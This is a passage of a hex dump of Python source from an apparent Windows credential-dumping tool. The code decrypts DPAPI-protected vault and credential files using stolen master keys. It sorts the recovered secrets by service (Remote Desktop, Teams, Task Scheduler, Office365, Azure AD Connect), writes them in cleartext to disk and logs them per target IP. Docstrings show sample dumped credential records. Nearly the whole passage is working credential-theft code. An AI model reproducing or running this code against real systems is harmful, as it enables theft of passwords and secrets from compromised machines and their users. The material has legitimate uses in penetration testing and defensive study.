-0000ba90: 5b6c 6f63 616c 6669 6c65 5d5b 2776 6175  [localfile]['vau
-0000baa0: 6c74 5f6e 616d 6527 5d20 3d20 6c6f 6e67  lt_name'] = long
-0000bab0: 6e61 6d65 320a 0909 0909 0909 0909 0909  name2...........
-0000bac0: 0975 7365 722e 6669 6c65 735b 6c6f 6e67  .user.files[long
-0000bad0: 6e61 6d65 5d5b 2776 7363 6827 5d5b 6c6f  name]['vsch'][lo
-0000bae0: 6361 6c66 696c 655d 5b27 7061 7468 275d  calfile]['path']
-0000baf0: 203d 206c 6f63 616c 6669 6c65 0a09 0909   = localfile....
-0000bb00: 0909 0909 0909 0909 636f 6e74 696e 7565  ........continue
-0000bb10: 0a09 0909 0909 0909 0909 0965 6c69 6620  ...........elif 
-0000bb20: 6c6f 6e67 6e61 6d65 325b 2d34 3a5d 203d  longname2[-4:] =
-0000bb30: 3d20 2776 6372 6427 3a0a 0909 0909 0909  = 'vcrd':.......
-0000bb40: 0909 0909 0975 7365 722e 6669 6c65 735b  .....user.files[
-0000bb50: 6c6f 6e67 6e61 6d65 5d5b 2776 6372 6427  longname]['vcrd'
-0000bb60: 5d5b 6c6f 6361 6c66 696c 655d 203d 207b  ][localfile] = {
-0000bb70: 7d0a 0909 0909 0909 0909 0909 0975 7365  }............use
-0000bb80: 722e 6669 6c65 735b 6c6f 6e67 6e61 6d65  r.files[longname
-0000bb90: 5d5b 2776 6372 6427 5d5b 6c6f 6361 6c66  ]['vcrd'][localf
-0000bba0: 696c 655d 5b27 7374 6174 7573 275d 203d  ile]['status'] =
-0000bbb0: 2027 656e 6372 7970 7465 6427 0a09 0909   'encrypted'....
-0000bbc0: 0909 0909 0909 0909 7573 6572 2e66 696c  ........user.fil
-0000bbd0: 6573 5b6c 6f6e 676e 616d 655d 5b27 7663  es[longname]['vc
-0000bbe0: 7264 275d 5b6c 6f63 616c 6669 6c65 5d5b  rd'][localfile][
-0000bbf0: 2774 7970 6527 5d20 3d20 2776 6372 6427  'type'] = 'vcrd'
-0000bc00: 0a09 0909 0909 0909 0909 0909 7573 6572  ............user
-0000bc10: 2e66 696c 6573 5b6c 6f6e 676e 616d 655d  .files[longname]
-0000bc20: 5b27 7663 7264 275d 5b6c 6f63 616c 6669  ['vcrd'][localfi
-0000bc30: 6c65 5d5b 2776 6175 6c74 5f6e 616d 6527  le]['vault_name'
-0000bc40: 5d20 3d20 6c6f 6e67 6e61 6d65 320a 0909  ] = longname2...
-0000bc50: 0909 0909 0909 0909 0975 7365 722e 6669  .........user.fi
-0000bc60: 6c65 735b 6c6f 6e67 6e61 6d65 5d5b 2776  les[longname]['v
-0000bc70: 6372 6427 5d5b 6c6f 6361 6c66 696c 655d  crd'][localfile]
-0000bc80: 5b27 7061 7468 275d 203d 206c 6f63 616c  ['path'] = local
-0000bc90: 6669 6c65 0a0a 0909 0909 0909 0909 0909  file............
-0000bca0: 6d79 6f70 7469 6f6e 7320 3d20 636f 7079  myoptions = copy
-0000bcb0: 2e64 6565 7063 6f70 7928 7365 6c66 2e6f  .deepcopy(self.o
-0000bcc0: 7074 696f 6e73 290a 0909 0909 0909 0909  ptions).........
-0000bcd0: 0909 6d79 6f70 7469 6f6e 732e 7663 7264  ..myoptions.vcrd
-0000bce0: 203d 206c 6f63 616c 6669 6c65 2020 2320   = localfile  # 
-0000bcf0: 5661 756c 7420 4669 6c65 2074 6f20 7061  Vault File to pa
-0000bd00: 7273 650a 0909 0909 0909 0909 0909 6d79  rse...........my
-0000bd10: 6f70 7469 6f6e 732e 7661 756c 746b 6579  options.vaultkey
-0000bd20: 7320 3d20 746d 705f 7661 756c 746b 6579  s = tmp_vaultkey
-0000bd30: 730a 0909 0909 0909 0909 0909 6d79 6f70  s...........myop
-0000bd40: 7469 6f6e 732e 7670 6f6c 203d 204e 6f6e  tions.vpol = Non
-0000bd50: 650a 0909 0909 0909 0909 0909 6d79 6f70  e...........myop
-0000bd60: 7469 6f6e 732e 6b65 7920 3d20 4e6f 6e65  tions.key = None
-0000bd70: 0a09 0909 0909 0909 0909 096d 7964 7061  ...........mydpa
-0000bd80: 7069 203d 2044 5041 5049 286d 796f 7074  pi = DPAPI(myopt
-0000bd90: 696f 6e73 2c20 7365 6c66 2e6c 6f67 6769  ions, self.loggi
-0000bda0: 6e67 290a 0909 0909 0909 0909 0909 7661  ng)...........va
-0000bdb0: 756c 745f 6461 7461 2c20 6461 7461 5f74  ult_data, data_t
-0000bdc0: 7970 6520 3d20 6d79 6470 6170 692e 6465  ype = mydpapi.de
-0000bdd0: 6372 7970 745f 7661 756c 7428 290a 0909  crypt_vault()...
-0000bde0: 0909 0909 0909 0909 6966 2076 6175 6c74  ........if vault
-0000bdf0: 5f64 6174 6120 213d 204e 6f6e 653a 0a09  _data != None:..
-0000be00: 0909 0909 0909 0909 0909 7573 6572 2e66  ..........user.f
-0000be10: 696c 6573 5b6c 6f6e 676e 616d 655d 5b27  iles[longname]['
-0000be20: 7663 7264 275d 5b6c 6f63 616c 6669 6c65  vcrd'][localfile
-0000be30: 5d5b 2773 7461 7475 7327 5d20 3d20 2764  ]['status'] = 'd
-0000be40: 6563 7279 7074 6564 270a 0909 0909 0909  ecrypted'.......
-0000be50: 0909 0909 0975 7365 722e 6669 6c65 735b  .....user.files[
-0000be60: 6c6f 6e67 6e61 6d65 5d5b 2776 6372 6427  longname]['vcrd'
-0000be70: 5d5b 6c6f 6361 6c66 696c 655d 5b27 6461  ][localfile]['da
-0000be80: 7461 275d 203d 2076 6175 6c74 5f64 6174  ta'] = vault_dat
-0000be90: 610a 0909 0909 0909 0909 0909 0975 7365  a............use
-0000bea0: 722e 6669 6c65 735b 6c6f 6e67 6e61 6d65  r.files[longname
-0000beb0: 5d5b 2776 6372 6427 5d5b 6c6f 6361 6c66  ]['vcrd'][localf
-0000bec0: 696c 655d 5b27 7661 756c 745f 7479 7065  ile]['vault_type
-0000bed0: 275d 203d 2064 6174 615f 7479 7065 0a09  '] = data_type..
-0000bee0: 0909 0909 0909 0909 0973 656c 662e 6c6f  .........self.lo
-0000bef0: 6767 696e 672e 6465 6275 6728 0a09 0909  gging.debug(....
-0000bf00: 0909 0909 0909 0909 6622 5b7b 7365 6c66  ........f"[{self
-0000bf10: 2e6f 7074 696f 6e73 2e74 6172 6765 745f  .options.target_
-0000bf20: 6970 7d5d 207b 6263 6f6c 6f72 732e 4f4b  ip}] {bcolors.OK
-0000bf30: 424c 5545 7d7b 7573 6572 2e75 7365 726e  BLUE}{user.usern
-0000bf40: 616d 657d 207b 6263 6f6c 6f72 732e 4f4b  ame} {bcolors.OK
-0000bf50: 4752 4545 4e7d 5661 756c 7420 2e76 6372  GREEN}Vault .vcr
-0000bf60: 6420 4465 6372 7970 7469 6f6e 2073 7563  d Decryption suc
-0000bf70: 6365 7373 6675 6c6c 202d 207b 6c6f 6361  cessfull - {loca
-0000bf80: 6c66 696c 657d 7b62 636f 6c6f 7273 2e45  lfile}{bcolors.E
-0000bf90: 4e44 437d 2229 0a09 0909 0909 0909 0909  NDC}")..........
-0000bfa0: 0973 656c 662e 7072 6f63 6573 735f 6465  .self.process_de
-0000bfb0: 6372 7970 7465 645f 7661 756c 7428 7573  crypted_vault(us
-0000bfc0: 6572 2c20 7573 6572 2e66 696c 6573 5b6c  er, user.files[l
-0000bfd0: 6f6e 676e 616d 655d 5b27 7663 7264 275d  ongname]['vcrd']
-0000bfe0: 5b0a 0909 0909 0909 0909 0909 096c 6f63  [............loc
-0000bff0: 616c 6669 6c65 5d29 2020 2320 7661 756c  alfile])  # vaul
-0000c000: 745f 6461 7461 2c75 7365 722c 6c6f 6361  t_data,user,loca
-0000c010: 6c66 696c 652c 6d79 5f62 6c6f 625f 7479  lfile,my_blob_ty
-0000c020: 7065 2c61 7267 733d 5b6c 6f6e 676e 616d  pe,args=[longnam
-0000c030: 6532 2c64 6174 615f 7479 7065 5d29 0a0a  e2,data_type])..
-0000c040: 0909 0909 0909 0909 0965 7863 6570 7420  .........except 
-0000c050: 4578 6365 7074 696f 6e20 6173 2065 783a  Exception as ex:
-0000c060: 0a09 0909 0909 0909 0909 0973 656c 662e  ...........self.
-0000c070: 6c6f 6767 696e 672e 6465 6275 6728 0a09  logging.debug(..
-0000c080: 0909 0909 0909 0909 0909 6622 5b7b 7365  ..........f"[{se
-0000c090: 6c66 2e6f 7074 696f 6e73 2e74 6172 6765  lf.options.targe
-0000c0a0: 745f 6970 7d5d 207b 6263 6f6c 6f72 732e  t_ip}] {bcolors.
-0000c0b0: 5741 524e 494e 477d 4578 6365 7074 696f  WARNING}Exceptio
-0000c0c0: 6e20 6465 6372 7970 7469 6e67 2076 6372  n decrypting vcr
-0000c0d0: 6420 5661 756c 7420 7769 7468 204d 6173  d Vault with Mas
-0000c0e0: 7465 726b 6579 202d 207b 6c6f 6e67 6e61  terkey - {longna
-0000c0f0: 6d65 327d 207b 6263 6f6c 6f72 732e 454e  me2} {bcolors.EN
-0000c100: 4443 7d22 290a 0909 0909 0909 0909 0909  DC}")...........
-0000c110: 7365 6c66 2e6c 6f67 6769 6e67 2e64 6562  self.logging.deb
-0000c120: 7567 2865 7829 0a09 0972 6574 7572 6e20  ug(ex)...return 
-0000c130: 310a 0a09 6465 6620 6475 6d70 5f74 6f5f  1...def dump_to_
-0000c140: 6669 6c65 2873 656c 662c 206c 6f63 616c  file(self, local
-0000c150: 6669 6c65 5f65 6e63 7279 7074 6564 2c20  file_encrypted, 
-0000c160: 6c6f 6361 6c64 6174 615f 6465 6372 7970  localdata_decryp
-0000c170: 7465 6429 3a0a 0909 7365 6c66 2e6c 6f67  ted):...self.log
-0000c180: 6769 6e67 2e64 6562 7567 2866 225b 7b73  ging.debug(f"[{s
-0000c190: 656c 662e 6f70 7469 6f6e 732e 7461 7267  elf.options.targ
-0000c1a0: 6574 5f69 707d 5d20 4475 6d70 696e 6720  et_ip}] Dumping 
-0000c1b0: 6465 6372 7970 7465 6420 7b6c 6f63 616c  decrypted {local
-0000c1c0: 6669 6c65 5f65 6e63 7279 7074 6564 7d20  file_encrypted} 
-0000c1d0: 746f 2066 696c 657b 6263 6f6c 6f72 732e  to file{bcolors.
-0000c1e0: 454e 4443 7d22 290a 0909 7472 793a 0a09  ENDC}")...try:..
-0000c1f0: 0909 6c6f 6361 6c66 696c 655f 6465 6372  ..localfile_decr
-0000c200: 7970 7465 6420 3d20 6f73 2e70 6174 682e  ypted = os.path.
-0000c210: 6a6f 696e 286f 732e 7061 7468 2e73 706c  join(os.path.spl
-0000c220: 6974 286c 6f63 616c 6669 6c65 5f65 6e63  it(localfile_enc
-0000c230: 7279 7074 6564 295b 305d 2c0a 0909 0909  rypted)[0],.....
-0000c240: 0909 0909 0909 0920 2020 6f73 2e70 6174  .......   os.pat
-0000c250: 682e 7370 6c69 7428 6c6f 6361 6c66 696c  h.split(localfil
-0000c260: 655f 656e 6372 7970 7465 6429 5b31 5d20  e_encrypted)[1] 
-0000c270: 2b20 225f 6465 6372 7970 7465 6422 290a  + "_decrypted").
-0000c280: 0909 0966 6820 3d20 6f70 656e 286c 6f63  ...fh = open(loc
-0000c290: 616c 6669 6c65 5f64 6563 7279 7074 6564  alfile_decrypted
-0000c2a0: 2c20 2777 6227 290a 0909 0966 682e 7772  , 'wb')....fh.wr
-0000c2b0: 6974 6528 6622 7b6c 6f63 616c 6461 7461  ite(f"{localdata
-0000c2c0: 5f64 6563 7279 7074 6564 7d22 2e65 6e63  _decrypted}".enc
-0000c2d0: 6f64 6528 2775 7466 2d38 2729 290a 0909  ode('utf-8'))...
-0000c2e0: 0966 682e 636c 6f73 6528 290a 0909 0972  .fh.close()....r
-0000c2f0: 6574 7572 6e20 310a 0909 6578 6365 7074  eturn 1...except
-0000c300: 2045 7863 6570 7469 6f6e 2061 7320 6578   Exception as ex
-0000c310: 3a0a 0909 0973 656c 662e 6c6f 6767 696e  :....self.loggin
-0000c320: 672e 6465 6275 6728 6622 5b7b 7365 6c66  g.debug(f"[{self
-0000c330: 2e6f 7074 696f 6e73 2e74 6172 6765 745f  .options.target_
-0000c340: 6970 7d5d 207b 6263 6f6c 6f72 732e 5741  ip}] {bcolors.WA
-0000c350: 524e 494e 477d 4578 6365 7074 696f 6e20  RNING}Exception 
-0000c360: 6475 6d70 5f74 6f5f 6669 6c65 7b62 636f  dump_to_file{bco
-0000c370: 6c6f 7273 2e45 4e44 437d 2229 0a09 0909  lors.ENDC}")....
-0000c380: 7365 6c66 2e6c 6f67 6769 6e67 2e64 6562  self.logging.deb
-0000c390: 7567 2865 7829 0a0a 0964 6566 2070 726f  ug(ex)...def pro
-0000c3a0: 6365 7373 5f64 6563 7279 7074 6564 5f64  cess_decrypted_d
-0000c3b0: 6174 6128 7365 6c66 2c20 7573 6572 2c20  ata(self, user, 
-0000c3c0: 7365 6372 6574 5f66 696c 6529 3a20 2023  secret_file):  #
-0000c3d0: 2064 6174 6120 2c75 7365 7220 2c6c 6f63   data ,user ,loc
-0000c3e0: 616c 6669 6c65 2c62 6c6f 625f 7479 7065  alfile,blob_type
-0000c3f0: 2c61 7267 733d 5b5d 293a 0a09 0974 7279  ,args=[]):...try
-0000c400: 3a0a 0909 0973 656c 662e 6c6f 6767 696e  :....self.loggin
-0000c410: 672e 6465 6275 6728 6622 5b7b 7365 6c66  g.debug(f"[{self
-0000c420: 2e6f 7074 696f 6e73 2e74 6172 6765 745f  .options.target_
-0000c430: 6970 7d5d 205b 2b5d 2070 726f 6365 7373  ip}] [+] process
-0000c440: 5f64 6563 7279 7074 6564 5f64 6174 6120  _decrypted_data 
-0000c450: 6f66 207b 7365 6372 6574 5f66 696c 657d  of {secret_file}
-0000c460: 207b 6263 6f6c 6f72 732e 454e 4443 7d22   {bcolors.ENDC}"
-0000c470: 290a 0909 0962 6c6f 625f 7479 7065 203d  )....blob_type =
-0000c480: 2073 6563 7265 745f 6669 6c65 5b27 7479   secret_file['ty
-0000c490: 7065 275d 0a09 0909 6c6f 6361 6c66 696c  pe']....localfil
-0000c4a0: 6520 3d20 7365 6372 6574 5f66 696c 655b  e = secret_file[
-0000c4b0: 2770 6174 6827 5d0a 0909 0964 6174 6120  'path']....data 
-0000c4c0: 3d20 7365 6372 6574 5f66 696c 655b 2764  = secret_file['d
-0000c4d0: 6174 6127 5d0a 0909 0969 6620 626c 6f62  ata']....if blob
-0000c4e0: 5f74 7970 6520 3d3d 2027 7264 6727 3a0a  _type == 'rdg':.
-0000c4f0: 0909 0909 7365 6c66 2e6c 6f67 6769 6e67  ....self.logging
-0000c500: 2e64 6562 7567 2822 4954 2053 2041 2052  .debug("IT S A R
-0000c510: 656d 6f74 6520 4465 736b 746f 7020 4372  emote Desktop Cr
-0000c520: 6564 2066 696c 6522 290a 0909 0909 636c  ed file").....cl
-0000c530: 6561 725f 6461 7461 203d 2073 656c 662e  ear_data = self.
-0000c540: 6475 6d70 5f63 7265 6465 6e74 6961 6c5f  dump_credential_
-0000c550: 626c 6f62 2864 6174 6129 0a09 0909 656c  blob(data)....el
-0000c560: 6966 2062 6c6f 625f 7479 7065 203d 3d20  if blob_type == 
-0000c570: 2763 7265 6465 6e74 6961 6c27 3a0a 0a09  'credential':...
-0000c580: 0909 0969 6620 2744 6f6d 6169 6e3a 7461  ...if 'Domain:ta
-0000c590: 7267 6574 3d54 4552 4d53 5256 2720 696e  rget=TERMSRV' in
-0000c5a0: 2064 6174 615b 2754 6172 6765 7427 5d2e   data['Target'].
-0000c5b0: 6465 636f 6465 2827 7574 662d 3136 6c65  decode('utf-16le
-0000c5c0: 2729 206f 7220 274c 6567 6163 7947 656e  ') or 'LegacyGen
-0000c5d0: 6572 6963 3a74 6172 6765 743d 5445 524d  eric:target=TERM
-0000c5e0: 5352 5627 2069 6e20 5c0a 0909 0909 0909  SRV' in \.......
-0000c5f0: 6461 7461 5b27 5461 7267 6574 275d 2e64  data['Target'].d
-0000c600: 6563 6f64 6528 2775 7466 2d31 366c 6527  ecode('utf-16le'
-0000c610: 293a 0a09 0909 0909 636c 6561 725f 6461  ):......clear_da
-0000c620: 7461 203d 2073 656c 662e 6475 6d70 5f43  ta = self.dump_C
-0000c630: 5245 4445 4e54 4941 4c5f 5453 4528 7573  REDENTIAL_TSE(us
-0000c640: 6572 2c20 6c6f 6361 6c66 696c 652c 2064  er, localfile, d
-0000c650: 6174 6129 0a09 0909 0965 6c69 6620 2744  ata).....elif 'D
-0000c660: 6f6d 6169 6e3a 7461 7267 6574 3d6d 7374  omain:target=mst
-0000c670: 6561 6d73 2720 696e 2064 6174 615b 2754  eams' in data['T
-0000c680: 6172 6765 7427 5d2e 6465 636f 6465 2827  arget'].decode('
-0000c690: 7574 662d 3136 6c65 2729 206f 7220 274c  utf-16le') or 'L
-0000c6a0: 6567 6163 7947 656e 6572 6963 3a74 6172  egacyGeneric:tar
-0000c6b0: 6765 743d 6d73 7465 616d 7327 2069 6e20  get=msteams' in 
-0000c6c0: 5c0a 0909 0909 0909 6461 7461 5b27 5461  \.......data['Ta
-0000c6d0: 7267 6574 275d 2e64 6563 6f64 6528 2775  rget'].decode('u
-0000c6e0: 7466 2d31 366c 6527 293a 0a09 0909 0909  tf-16le'):......
-0000c6f0: 7365 6c66 2e6c 6f67 6769 6e67 2e64 6562  self.logging.deb
-0000c700: 7567 2822 4954 2053 2041 204d 5354 6561  ug("IT S A MSTea
-0000c710: 6d20 4372 6564 656e 7469 616c 2122 290a  m Credential!").
-0000c720: 0909 0909 0963 6c65 6172 5f64 6174 6120  .....clear_data 
-0000c730: 3d20 7365 6c66 2e64 756d 705f 4352 4544  = self.dump_CRED
-0000c740: 454e 5449 414c 5f54 5345 2875 7365 722c  ENTIAL_TSE(user,
-0000c750: 206c 6f63 616c 6669 6c65 2c20 6461 7461   localfile, data
-0000c760: 290a 0909 0909 656c 6966 2027 446f 6d61  ).....elif 'Doma
-0000c770: 696e 3a62 6174 6368 3d54 6173 6b53 6368  in:batch=TaskSch
-0000c780: 6564 756c 6572 2720 696e 2064 6174 615b  eduler' in data[
-0000c790: 2754 6172 6765 7427 5d2e 6465 636f 6465  'Target'].decode
-0000c7a0: 280a 0909 0909 0909 2775 7466 2d31 366c  (.......'utf-16l
-0000c7b0: 6527 2920 6f72 2027 4c65 6761 6379 4765  e') or 'LegacyGe
-0000c7c0: 6e65 7269 633a 7461 7267 6574 3d6d 7374  neric:target=mst
-0000c7d0: 6561 6d73 2720 696e 2064 6174 615b 2754  eams' in data['T
-0000c7e0: 6172 6765 7427 5d2e 6465 636f 6465 2827  arget'].decode('
-0000c7f0: 7574 662d 3136 6c65 2729 3a0a 0909 0909  utf-16le'):.....
-0000c800: 0973 656c 662e 6c6f 6767 696e 672e 6465  .self.logging.de
-0000c810: 6275 6728 2249 5420 5320 4120 5461 736b  bug("IT S A Task
-0000c820: 5363 6865 6475 6c65 7220 4372 6564 2122  Scheduler Cred!"
-0000c830: 290a 0909 0909 0963 6c65 6172 5f64 6174  )......clear_dat
-0000c840: 6120 3d20 7365 6c66 2e64 756d 705f 4352  a = self.dump_CR
-0000c850: 4544 454e 5449 414c 5f54 4153 4b53 4348  EDENTIAL_TASKSCH
-0000c860: 4544 554c 4552 2875 7365 722c 206c 6f63  EDULER(user, loc
-0000c870: 616c 6669 6c65 2c20 6461 7461 290a 0909  alfile, data)...
-0000c880: 0909 0927 2727 446f 6d61 696e 3a62 6174  ...'''Domain:bat
-0000c890: 6368 3d54 6173 6b53 6368 6564 756c 6572  ch=TaskScheduler
-0000c8a0: 3a54 6173 6b3a 7b33 3133 3638 3639 352d  :Task:{31368695-
-0000c8b0: 7878 7878 7878 7878 7878 787d 0a09 0909  xxxxxxxxxxx}....
-0000c8c0: 0909 5573 6572 6e61 6d65 2020 2020 3a20  ..Username    : 
-0000c8d0: 446f 6d61 696e 5c41 646d 696e 6973 7472  Domain\Administr
-0000c8e0: 6174 6575 720a 0909 0909 0955 6e6b 6e6f  ateur......Unkno
-0000c8f0: 776e 3320 2020 2020 3a20 4026 2626 2626  wn3     : @&&&&&
-0000c900: 2626 0a09 0909 0909 2727 270a 0909 0909  &&......'''.....
-0000c910: 656c 6966 2027 446f 6d61 696e 3a74 6172  elif 'Domain:tar
-0000c920: 6765 743d 4d69 6372 6f73 6f66 744f 6666  get=MicrosoftOff
-0000c930: 6963 6531 365f 4461 7461 3a6f 7267 6964  ice16_Data:orgid
-0000c940: 2720 696e 2064 6174 615b 2754 6172 6765  ' in data['Targe
-0000c950: 7427 5d2e 6465 636f 6465 280a 0909 0909  t'].decode(.....
-0000c960: 0909 2775 7466 2d31 366c 6527 2920 6f72  ..'utf-16le') or
-0000c970: 2027 4c65 6761 6379 4765 6e65 7269 633a   'LegacyGeneric:
-0000c980: 7461 7267 6574 3d4d 6963 726f 736f 6674  target=Microsoft
-0000c990: 4f66 6669 6365 3136 5f44 6174 613a 6f72  Office16_Data:or
-0000c9a0: 6769 6427 2069 6e20 6461 7461 5b27 5461  gid' in data['Ta
-0000c9b0: 7267 6574 275d 2e64 6563 6f64 6528 0a09  rget'].decode(..
-0000c9c0: 0909 0909 0927 7574 662d 3136 6c65 2729  .....'utf-16le')
-0000c9d0: 3a0a 0909 0909 0973 656c 662e 6c6f 6767  :......self.logg
-0000c9e0: 696e 672e 6465 6275 6728 2249 5420 5320  ing.debug("IT S 
-0000c9f0: 4120 4f66 6669 6365 3336 3520 4372 6564  A Office365 Cred
-0000ca00: 2122 290a 0909 0909 0963 6c65 6172 5f64  !")......clear_d
-0000ca10: 6174 6120 3d20 7365 6c66 2e64 756d 705f  ata = self.dump_
-0000ca20: 4352 4544 454e 5449 414c 5f54 5345 2875  CREDENTIAL_TSE(u
-0000ca30: 7365 722c 206c 6f63 616c 6669 6c65 2c20  ser, localfile, 
-0000ca40: 6461 7461 290a 0909 0909 0927 2727 0a09  data)......'''..
-0000ca50: 0909 0909 0909 0909 5b43 5245 4445 4e54  ........[CREDENT
-0000ca60: 4941 4c5d 0a09 0909 0909 4c61 7374 5772  IAL]......LastWr
-0000ca70: 6974 7465 6e20 3a20 3230 3230 2d30 322d  itten : 2020-02-
-0000ca80: 3138 2030 383a 3438 3a33 390a 0909 0909  18 08:48:39.....
-0000ca90: 0946 6c61 6773 2020 2020 2020 203a 2034  .Flags       : 4
-0000caa0: 3820 2843 5245 445f 464c 4147 535f 5245  8 (CRED_FLAGS_RE
-0000cab0: 5155 4952 455f 434f 4e46 4952 4d41 5449  QUIRE_CONFIRMATI
-0000cac0: 4f4e 7c43 5245 445f 464c 4147 535f 5749  ON|CRED_FLAGS_WI
-0000cad0: 4c44 4341 5244 5f4d 4154 4348 290a 0909  LDCARD_MATCH)...
-0000cae0: 0909 0950 6572 7369 7374 2020 2020 203a  ...Persist     :
-0000caf0: 2030 7833 2028 4352 4544 5f50 4552 5349   0x3 (CRED_PERSI
-0000cb00: 5354 5f45 4e54 4552 5052 4953 4529 0a09  ST_ENTERPRISE)..
-0000cb10: 0909 0909 5479 7065 2020 2020 2020 2020  ....Type        
-0000cb20: 3a20 3078 3120 2843 5245 445f 5045 5253  : 0x1 (CRED_PERS
-0000cb30: 4953 545f 5345 5353 494f 4e29 0a09 0909  IST_SESSION)....
-0000cb40: 0909 5461 7267 6574 2020 2020 2020 3a20  ..Target      : 
-0000cb50: 4c65 6761 6379 4765 6e65 7269 633a 7461  LegacyGeneric:ta
-0000cb60: 7267 6574 3d4d 6963 726f 736f 6674 4f66  rget=MicrosoftOf
-0000cb70: 6669 6365 3135 5f44 6174 613a 5353 5049  fice15_Data:SSPI
-0000cb80: 3a76 2e78 7878 7878 7878 4078 7878 7878  :v.xxxxxxx@xxxxx
-0000cb90: 782e 636f 6d0a 0909 0909 0944 6573 6372  x.com......Descr
-0000cba0: 6970 7469 6f6e 203a 200a 0909 0909 0955  iption : ......U
-0000cbb0: 6e6b 6e6f 776e 2020 2020 203a 200a 0909  nknown     : ...
-0000cbc0: 0909 0955 7365 726e 616d 6520 2020 203a  ...Username    :
-0000cbd0: 200a 0909 0909 0955 6e6b 6e6f 776e 3320   ......Unknown3 
-0000cbe0: 2020 2020 3a20 7878 7878 7878 7878 780a      : xxxxxxxxx.
-0000cbf0: 0a0a 0a09 0909 0909 2727 270a 0909 0909  ........'''.....
-0000cc00: 656c 6966 2027 5769 6e64 6f77 734c 6976  elif 'WindowsLiv
-0000cc10: 653a 7461 7267 6574 3d76 6972 7475 616c  e:target=virtual
-0000cc20: 6170 702f 6469 646c 6f67 6963 616c 2720  app/didlogical' 
-0000cc30: 696e 2064 6174 615b 2754 6172 6765 7427  in data['Target'
-0000cc40: 5d2e 6465 636f 6465 2827 7574 662d 3136  ].decode('utf-16
-0000cc50: 6c65 2729 3a0a 0909 0909 0973 656c 662e  le'):......self.
-0000cc60: 6c6f 6767 696e 672e 6465 6275 6728 2249  logging.debug("I
-0000cc70: 5420 5320 4120 5769 6e64 6f77 7320 4c69  T S A Windows Li
-0000cc80: 7665 2073 6572 7669 6365 206f 7220 6170  ve service or ap
-0000cc90: 706c 6963 6174 696f 6e20 4372 6564 2122  plication Cred!"
-0000cca0: 290a 0909 0909 0963 6c65 6172 5f64 6174  )......clear_dat
-0000ccb0: 6120 3d20 7365 6c66 2e64 756d 705f 6372  a = self.dump_cr
-0000ccc0: 6564 656e 7469 616c 5f62 6c6f 6228 7573  edential_blob(us
-0000ccd0: 6572 2c20 6c6f 6361 6c66 696c 652c 2064  er, localfile, d
-0000cce0: 6174 6129 0a09 0909 0923 2041 4443 4f4e  ata).....# ADCON
-0000ccf0: 4e45 4354 0a09 0909 0965 6c69 6620 274d  NECT.....elif 'M
-0000cd00: 6963 726f 736f 6674 5f41 7a75 7265 4144  icrosoft_AzureAD
-0000cd10: 436f 6e6e 6563 745f 4b65 7953 6574 2720  Connect_KeySet' 
-0000cd20: 696e 2064 6174 615b 2754 6172 6765 7427  in data['Target'
-0000cd30: 5d2e 6465 636f 6465 2827 7574 662d 3136  ].decode('utf-16
-0000cd40: 6c65 2729 3a0a 0909 0909 0973 656c 662e  le'):......self.
-0000cd50: 6c6f 6767 696e 672e 6465 6275 6728 6622  logging.debug(f"
-0000cd60: 7b62 636f 6c6f 7273 2e57 4152 4e49 4e47  {bcolors.WARNING
-0000cd70: 7d49 5420 5320 4120 4d69 6372 6f73 6f66  }IT S A Microsof
-0000cd80: 745f 417a 7572 6541 4443 6f6e 6e65 6374  t_AzureADConnect
-0000cd90: 5f4b 6579 5365 7420 4372 6564 217b 6263  _KeySet Cred!{bc
-0000cda0: 6f6c 6f72 732e 454e 4443 7d22 290a 0909  olors.ENDC}")...
-0000cdb0: 0909 0963 6c65 6172 5f64 6174 6120 3d20  ...clear_data = 
-0000cdc0: 7365 6c66 2e47 6574 5f41 445f 436f 6e6e  self.Get_AD_Conn
-0000cdd0: 6563 7428 7573 6572 2c20 6c6f 6361 6c66  ect(user, localf
-0000cde0: 696c 652c 2064 6174 6129 0a09 0909 0965  ile, data).....e
-0000cdf0: 6c69 6620 274c 6567 6163 7947 656e 6572  lif 'LegacyGener
-0000ce00: 6963 3a74 6172 6765 743d 2720 696e 2064  ic:target=' in d
-0000ce10: 6174 615b 2754 6172 6765 7427 5d2e 6465  ata['Target'].de
-0000ce20: 636f 6465 2827 7574 662d 3136 6c65 2729  code('utf-16le')
-0000ce30: 3a20 2023 2041 7574 7265 7320 5461 7267  :  # Autres Targ
-0000ce40: 6574 730a 0909 0909 0973 656c 662e 6c6f  ets......self.lo
-0000ce50: 6767 696e 672e 6465 6275 6728 224f 7468  gging.debug("Oth
-0000ce60: 6572 206c 6567 6163 7920 4372 6564 656e  er legacy Creden
-0000ce70: 7469 616c 2229 0a09 0909 0909 636c 6561  tial")......clea
-0000ce80: 725f 6461 7461 203d 2073 656c 662e 6475  r_data = self.du
-0000ce90: 6d70 5f63 7265 6465 6e74 6961 6c5f 626c  mp_credential_bl
-0000cea0: 6f62 2875 7365 722c 206c 6f63 616c 6669  ob(user, localfi
-0000ceb0: 6c65 2c20 6461 7461 290a 0909 0909 656c  le, data).....el
-0000cec0: 7365 3a0a 0909 0909 0973 656c 662e 6c6f  se:......self.lo
-0000ced0: 6767 696e 672e 6465 6275 6728 2255 6e6b  gging.debug("Unk
-0000cee0: 6e6f 776e 2043 7265 6420 5461 7267 6574  nown Cred Target
-0000cef0: 2063 6f6e 7465 6e74 202d 2074 6573 7469   content - testi
-0000cf00: 6e67 2061 7320 4372 6564 656e 7469 616c  ng as Credential
-0000cf10: 2042 4c4f 4222 290a 0909 0909 0963 6c65   BLOB")......cle
-0000cf20: 6172 5f64 6174 6120 3d20 7365 6c66 2e64  ar_data = self.d
-0000cf30: 756d 705f 6372 6564 656e 7469 616c 5f62  ump_credential_b
-0000cf40: 6c6f 6228 7573 6572 2c20 6c6f 6361 6c66  lob(user, localf
-0000cf50: 696c 652c 2064 6174 6129 0a09 0909 0923  ile, data).....#
-0000cf60: 2063 6c65 6172 5f64 6174 6120 3d20 2727   clear_data = ''
-0000cf70: 0a09 0909 0973 6563 7265 745f 6669 6c65  .....secret_file
-0000cf80: 5b27 7365 6372 6574 275d 203d 2063 6c65  ['secret'] = cle
-0000cf90: 6172 5f64 6174 610a 0909 0909 7365 6c66  ar_data.....self
-0000cfa0: 2e64 756d 705f 746f 5f66 696c 6528 6c6f  .dump_to_file(lo
-0000cfb0: 6361 6c66 696c 652c 2063 6c65 6172 5f64  calfile, clear_d
-0000cfc0: 6174 6129 0a09 0909 0973 656c 662e 6c6f  ata).....self.lo
-0000cfd0: 6773 6563 7265 7428 636c 6561 725f 6461  gsecret(clear_da
-0000cfe0: 7461 290a 0a09 0923 2054 5345 2041 6363  ta)....# TSE Acc
